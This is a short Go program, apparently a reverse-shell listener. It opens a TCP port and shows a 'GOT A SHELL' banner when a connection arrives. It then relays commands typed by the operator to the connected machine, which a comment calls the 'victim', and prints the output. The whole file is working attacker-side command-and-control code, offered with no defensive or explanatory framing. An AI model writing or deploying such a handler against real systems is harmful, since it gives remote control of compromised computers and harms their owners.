package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
)

func main() {
	ln, _ := net.Listen("tcp", "127.0.0.1:8080")
	for {
		conn, _ := ln.Accept()
		handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	fmt.Print("\033[H\033[2J")
	fmt.Println("\n██████╗  ██████╗ ████████╗     █████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     \n██╔════╝ ██╔═══██╗╚══██╔══╝    ██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     \n██║  ███╗██║   ██║   ██║       ███████║    ███████╗███████║█████╗  ██║     ██║     \n██║   ██║██║   ██║   ██║       ██╔══██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     \n╚██████╔╝╚██████╔╝   ██║       ██║  ██║    ███████║██║  ██║███████╗███████╗███████╗\n╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
	fmt.Println("Connection received !\n ")

	for {
		// Read command from Stdin and send to victim
		reader := bufio.NewReader(os.Stdin)
		cmd, _ := reader.ReadString('\n')
		fmt.Fprintln(conn, cmd)

		// Receive input from connection
		data, _ := bufio.NewReader(conn).ReadString('\n')
		fmt.Println(data)
	}
}
